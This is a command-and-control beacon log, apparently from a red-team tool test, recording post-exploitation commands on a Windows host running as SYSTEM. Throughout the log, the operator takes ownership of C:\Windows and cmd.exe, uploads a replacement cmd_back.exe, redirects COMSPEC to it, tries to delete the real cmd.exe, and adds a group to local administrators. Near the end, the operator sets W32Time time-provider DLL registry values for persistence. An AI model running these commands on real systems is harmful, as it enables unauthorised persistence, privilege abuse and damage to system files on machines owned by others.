02/03 16:28:54 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 1556; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 16:29:46 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 16:29:46 [task] Tasked beacon to run: icacls "C:\Windows" /grant Administrators:F
02/03 16:29:46 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:29:47 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:29:47 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:29:47 [task] cd c:\RedTeam\
02/03 16:29:47 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:29:47 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:29:47 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:29:47 [task] cd c:\RedTeam\
02/03 16:29:47 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 16:29:47 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:29:47 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd.exe
02/03 16:29:47 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:29:47 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:29:49 [checkin] host called home, sent: 345830 bytes
02/03 16:29:54 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 16:29:54 [output]
received output:
已处理的文件: C:\Windows
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:29:54 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:29:54 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:29:54 [output]
received output:
系统无法在消息文件中为 Application 找到消息号为 0x2336 的消息文本。


02/03 16:29:54 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:29:54 [output]
received output:
C:\Windows\System32\cmd.exe
系统无法在消息文件中为 System 找到消息号为 0x5 的消息文本。


02/03 16:29:54 [output]
received output:
命令成功完成。



02/03 16:29:54 [output]
received output:
命令成功完成。



02/03 16:34:08 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 16:34:08 [task] Tasked beacon to run: icacls "C:\Windows" /grant Administrators:F
02/03 16:34:08 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:34:08 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:34:09 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:34:09 [task] cd c:\RedTeam\
02/03 16:34:09 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:34:09 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:34:09 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:34:09 [task] cd c:\RedTeam\
02/03 16:34:09 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 16:34:09 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:34:09 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd.exe
02/03 16:34:09 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:34:09 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:34:54 [checkin] host called home, sent: 345830 bytes
02/03 16:34:58 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 16:34:58 [output]
received output:
已处理的文件: C:\Windows
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:34:58 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:34:58 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:34:58 [output]
received output:
系统无法在消息文件中为 Application 找到消息号为 0x2336 的消息文本。


02/03 16:34:58 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:34:58 [output]
received output:
C:\Windows\System32\cmd.exe
系统无法在消息文件中为 System 找到消息号为 0x5 的消息文本。


02/03 16:34:58 [output]
received output:
命令成功完成。



02/03 16:34:58 [output]
received output:
命令成功完成。



02/03 16:36:14 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 16:36:14 [task] Tasked beacon to run: icacls "C:\Windows" /grant Administrators:F
02/03 16:36:14 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:36:15 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:36:15 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:36:15 [task] cd c:\RedTeam\
02/03 16:36:15 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:36:15 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:36:15 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:36:15 [task] cd c:\RedTeam\
02/03 16:36:15 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\
02/03 16:36:15 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:36:15 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd.exe
02/03 16:36:15 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:36:15 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:36:58 [checkin] host called home, sent: 346037 bytes
02/03 16:37:06 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 16:37:06 [output]
received output:
已处理的文件: C:\Windows
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:37:06 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:37:06 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:37:06 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:37:06 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-Item : 找不到接受实际参数“/q”的位置形式参数。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 4_x000D__x000A_</S><S S="Error">+ del &lt;&lt;&lt;&lt;  /s /q C:\Windows\System32\cmd.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (:) [Remove-Item], ParameterBin _x000D__x000A_</S><S S="Error">   dingException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell _x000D__x000A_</S><S S="Error">   .Commands.RemoveItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/03 16:37:06 [output]
received output:
命令成功完成。



02/03 16:37:06 [output]
received output:
命令成功完成。



02/03 16:37:38 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 16:37:38 [task] Tasked beacon to run: icacls "C:\Windows" /grant Administrators:F
02/03 16:37:39 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:37:39 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:37:39 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:37:39 [task] cd c:\RedTeam\
02/03 16:37:39 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:37:39 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:37:39 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:37:39 [task] cd c:\RedTeam\
02/03 16:37:39 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\
02/03 16:37:39 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:37:39 [task] Tasked beacon to run: del C:\Windows\System32\cmd.exe
02/03 16:37:39 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:37:39 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:38:06 [checkin] host called home, sent: 346021 bytes
02/03 16:38:14 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 16:38:14 [output]
received output:
已处理的文件: C:\Windows
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:38:14 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:38:14 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:38:14 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:38:14 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-Item : 无法删除项 C:\Windows\System32\cmd.exe: 对路径“C:\Windows\System_x000D__x000A_</S><S S="Error">32\cmd.exe”的访问被拒绝。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 4_x000D__x000A_</S><S S="Error">+ del &lt;&lt;&lt;&lt;  C:\Windows\System32\cmd.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (C:\Windows\System32\cmd.exe:F _x000D__x000A_</S><S S="Error">   ileInfo) [Remove-Item], UnauthorizedAccessException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : RemoveFileSystemItemUnAuthorizedAccess,Microsoft _x000D__x000A_</S><S S="Error">   .PowerShell.Commands.RemoveItemCommand_x000D__x000A_</S></Objs>

02/03 16:38:14 [output]
received output:
命令成功完成。



02/03 16:38:14 [output]
received output:
命令成功完成。



02/03 16:48:12 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 16:48:12 [task] Tasked beacon to run: icacls "C:\Windows" /grant Everone:F
02/03 16:48:12 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:48:12 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Everone:F
02/03 16:48:12 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:48:13 [task] cd c:\RedTeam\
02/03 16:48:13 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:48:13 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:48:13 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:48:13 [task] cd c:\RedTeam\
02/03 16:48:13 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\
02/03 16:48:13 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:48:13 [task] Tasked beacon to run: del C:\Windows\System32\cmd.exe
02/03 16:48:13 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:48:13 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:48:14 [checkin] host called home, sent: 346007 bytes
02/03 16:48:16 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 16:48:16 [output]
received output:
Everone: 帐户名与安全标识间无任何映射完成。
已成功处理 0 个文件; 处理 1 个文件时失败


02/03 16:48:16 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:48:16 [output]
received output:
Everone: 帐户名与安全标识间无任何映射完成。
已成功处理 0 个文件; 处理 1 个文件时失败


02/03 16:48:16 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:48:16 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-Item : 无法删除项 C:\Windows\System32\cmd.exe: 对路径“C:\Windows\System_x000D__x000A_</S><S S="Error">32\cmd.exe”的访问被拒绝。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 4_x000D__x000A_</S><S S="Error">+ del &lt;&lt;&lt;&lt;  C:\Windows\System32\cmd.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (C:\Windows\System32\cmd.exe:F _x000D__x000A_</S><S S="Error">   ileInfo) [Remove-Item], UnauthorizedAccessException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : RemoveFileSystemItemUnAuthorizedAccess,Microsoft _x000D__x000A_</S><S S="Error">   .PowerShell.Commands.RemoveItemCommand_x000D__x000A_</S></Objs>

02/03 16:48:16 [output]
received output:
命令成功完成。



02/03 16:48:16 [output]
received output:
命令成功完成。



02/03 17:06:55 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 17:06:55 [task] Tasked beacon to run: icacls "C:\Windows" /grant Administrators:F
02/03 17:06:55 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 17:06:55 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 17:06:55 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 17:06:55 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 17:06:55 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 17:06:55 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 17:07:17 [checkin] host called home, sent: 794 bytes
02/03 17:07:21 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 17:07:21 [output]
received output:
已处理的文件: C:\Windows
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 17:07:21 [output]
received output:
错误: 系统找不到指定的文件。


02/03 17:07:21 [output]
received output:
C:\Windows\System32\cmd.exe: 系统找不到指定的文件。
已成功处理 0 个文件; 处理 1 个文件时失败


02/03 17:07:21 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Rename-Item : 无法重命名，因为“C:\Windows\System32\cmd.exe”处不存在项。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 4_x000D__x000A_</S><S S="Error">+ ren &lt;&lt;&lt;&lt;  C:\Windows\System32\cmd.exe cmd_back.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (:) [Rename-Item], PSInvalidOp _x000D__x000A_</S><S S="Error">   erationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : InvalidOperation,Microsoft.PowerShell.Commands.R _x000D__x000A_</S><S S="Error">   enameItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/03 17:07:21 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:07:21 [output]
received output:
命令成功完成。



02/03 17:07:21 [output]
received output:
命令成功完成。



02/03 17:11:19 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 17:11:19 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 17:11:22 [checkin] host called home, sent: 374 bytes
02/03 17:11:38 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:13:16 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 17:13:16 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 17:13:16 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 17:13:16 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 17:13:16 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 17:13:16 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 17:13:38 [checkin] host called home, sent: 663 bytes
02/03 17:13:42 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 17:13:42 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 17:13:42 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:13:42 [output]
received output:
命令成功完成。



02/03 17:13:42 [output]
received output:
命令成功完成。



02/03 17:14:36 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 17:14:36 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 17:14:42 [checkin] host called home, sent: 374 bytes
02/03 17:14:45 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:16:08 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 17:16:08 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 17:16:08 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 17:16:08 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 17:16:08 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 17:16:08 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 17:16:45 [checkin] host called home, sent: 663 bytes
02/03 17:16:47 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 17:16:47 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 17:16:47 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:16:47 [output]
received output:
命令成功完成。



02/03 17:16:47 [output]
received output:
命令成功完成。



02/03 17:24:55 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 17:24:55 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 17:25:03 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 17:25:03 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 17:25:03 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 17:25:03 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 17:25:03 [task] Tasked beacon to run: Net Localgroup adminstrator Tests /del
02/03 17:25:03 [task] Tasked beacon to run: Net Localgroup adminstrator Tests /add
02/03 17:25:47 [checkin] host called home, sent: 1063 bytes
02/03 17:25:51 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:25:51 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 17:25:51 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 17:25:51 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:25:51 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 17:25:51 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 17:28:08 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 17:28:08 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 17:28:13 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 17:28:13 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 17:28:13 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 17:28:13 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 17:28:13 [task] Tasked beacon to run: Net Localgroup adminstrator Tests /del
02/03 17:28:13 [task] Tasked beacon to run: Net Localgroup adminstrator Tests /add
02/03 17:28:51 [checkin] host called home, sent: 1063 bytes
02/03 17:28:54 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:28:54 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 17:28:54 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 17:28:54 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:28:54 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 17:28:54 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 17:29:20 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 17:29:20 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 17:29:25 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 17:29:25 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 17:29:25 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 17:29:25 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 17:29:25 [task] Tasked beacon to run: Net Localgroup administrators Tests /del
02/03 17:29:25 [task] Tasked beacon to run: Net Localgroup administrators Tests /add
02/03 17:29:54 [checkin] host called home, sent: 1067 bytes
02/03 17:29:55 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:29:55 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 17:29:55 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 17:29:55 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:29:55 [output]
received output:
命令成功完成。



02/03 17:29:55 [output]
received output:
命令成功完成。



02/03 17:32:06 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 17:32:06 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 17:32:26 [task] Tasked beacon to run: Reg Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpClient /v dllname /t REG_SZ /f /D "c:\test.dll"
02/03 17:32:26 [task] Tasked beacon to run: Reg Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpServer  /v dllname /t REG_SZ /f /D "c:\test.dll"
02/03 17:32:55 [checkin] host called home, sent: 695 bytes
02/03 17:33:00 [output]
received output:

成功: 指定的值已得到保存。


02/03 17:33:00 [output]
received output:
Traceback (most recent call last):
  File "C:\Python37\Scripts\reg.py", line 4, in <module>
    __import__('pkg_resources').run_script('impacket==0.9.23.dev1+20210108.113210.1dec03a4', 'reg.py')
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3017, in <module>
    @_call_aside
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3003, in _call_aside
    f(*args, **kwargs)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3030, in _initialize_master_working_set
    working_set = WorkingSet._build_master()
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 659, in _build_master
    ws.require(__requires__)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 967, in require
    needed = self.resolve(parse_requirements(requirements))
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 853, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The 'pyOpenSSL>=0.13.1' distribution was not found and is required by impacket


02/03 17:33:00 [output]
received output:
Traceback (most recent call last):
  File "C:\Python37\Scripts\reg.py", line 4, in <module>
    __import__('pkg_resources').run_script('impacket==0.9.23.dev1+20210108.113210.1dec03a4', 'reg.py')
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3017, in <module>
    @_call_aside
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3003, in _call_aside
    f(*args, **kwargs)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3030, in _initialize_master_working_set
    working_set = WorkingSet._build_master()
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 659, in _build_master
    ws.require(__requires__)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 967, in require
    needed = self.resolve(parse_requirements(requirements))
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 853, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The 'pyOpenSSL>=0.13.1' distribution was not found and is required by impacket


02/03 17:37:44 [task] 4*******请先提权*******
02/03 17:37:59 [task] 4*******请先提权*******
02/03 17:39:24 [task] cd C:\Windows\System32\
02/03 17:39:24 [task] Tasked beacon to run: Reg Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpClient /v dllname /t REG_SZ /f /D "c:\test.dll"
02/03 17:39:24 [task] Tasked beacon to run: Reg Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpServer  /v dllname /t REG_SZ /f /D "c:\test.dll"
02/03 17:40:00 [checkin] host called home, sent: 349 bytes
02/03 17:40:00 [output]
received output:
操作成功完成。


02/03 17:40:00 [output]
received output:
操作成功完成。


02/03 17:42:33 [task] Tasked beacon to run: Reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpClient /v dllname  /f 
02/03 17:42:33 [task] Tasked beacon to run: Reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpServer  /v dllname  /f 
02/03 17:43:00 [checkin] host called home, sent: 277 bytes
02/03 17:43:00 [output]
received output:
操作成功完成。


02/03 17:43:00 [output]
received output:
操作成功完成。


